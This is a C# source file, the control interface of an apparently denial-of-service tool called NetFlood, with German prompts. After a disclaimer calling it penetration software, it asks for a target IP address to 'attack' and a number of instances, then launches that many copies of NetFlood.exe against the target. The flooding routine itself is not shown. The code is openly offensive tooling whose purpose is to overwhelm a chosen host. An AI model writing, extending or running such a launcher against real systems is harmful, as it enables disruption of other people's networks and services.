using System;
using System.Collections.Generic;
using System.Text;
using System.Diagnostics;
using System.Threading;

namespace NetFlood
{
    class Control
    {
        private void terms()
        {
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.BackgroundColor = ConsoleColor.Black;
            Console.Clear();
            Console.WriteLine("Controlling Interface\n\n");
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("NetFlood ist eine Penetrationssoftware und\ndarf auch nur als solche genutzt werden!");
            Console.WriteLine("Für jede andere Art des Gebrauchs ist der\nAnwender selbst verantwortlich");

                Console.Write("5");
                Thread.Sleep(1000);
                Console.Write("\r4");
                Thread.Sleep(1000);
                Console.Write("\r3");
                Thread.Sleep(1000);
                Console.Write("\r2");
                Thread.Sleep(1000);
                Console.Write("\r1");
                Thread.Sleep(1000);

            Console.Write("\rOK . . .");
            Console.ReadKey();
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.BackgroundColor = ConsoleColor.Black;
            Console.Clear();
            Console.WriteLine("Controlling Interface\n\n");
            Console.ForegroundColor = ConsoleColor.White;
        }

        public Control()
        {
            //Refusenik
            //Distributor
            
            int inst = 1;
            string confirm = "a";
            string ip = "127.0.0.1", enter = "";
            string HostName = System.Net.Dns.GetHostName();
            System.Net.IPHostEntry hostInfo = System.Net.Dns.GetHostEntry(HostName);
            string distri = hostInfo.AddressList[0].ToString();

            terms();

            Console.WriteLine("Welche IP-Adresse soll attackiert werden?");
            Console.Write("IP> "); enter = Console.ReadLine();
            if (enter == "") ip = "127.0.0.1"; else ip = enter; enter = "";
            Console.WriteLine("--------------------------------------------------------\n\n");

            Console.WriteLine("Wieviele Instanzen sollen gestartet werden?\n(Je mehr Instanzen desto mehr RAM wird benötigt)");
            Console.Write("instance> "); enter = Console.ReadLine();
            if (enter == "") inst = 1; else inst = Convert.ToInt32(enter); enter = "";
            Console.WriteLine("--------------------------------------------------------\n\n");

            Console.Clear();

            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("Review\n" + "------\n\n");
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.Write("Distributor: \t");
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine(distri);
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.Write("Refusenik: \t");
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine(ip);
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.Write("Instance: \t");
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine(inst + "\n\n");

            Console.ForegroundColor = ConsoleColor.Green;
            Console.Write("C");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("onfirm\t\t");

            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("A");
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("bort");

            Console.Write("\nNetFlood> "); confirm = Console.ReadLine();

            if (confirm.ToUpper() == "C")
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("Confirmed...");
                spam(ip, inst);
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Aborted...");
            }
            Console.ForegroundColor = ConsoleColor.White;
        }

        private void spam(string ip, int inst)
        {
            string dir = Environment.CurrentDirectory + "\\NetFlood.exe";

            for (int i = 0; i < inst; i++)
            {
                try
                {
                    Process.Start(dir, ip);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("Error!");
                }
            }
        }
    }
}
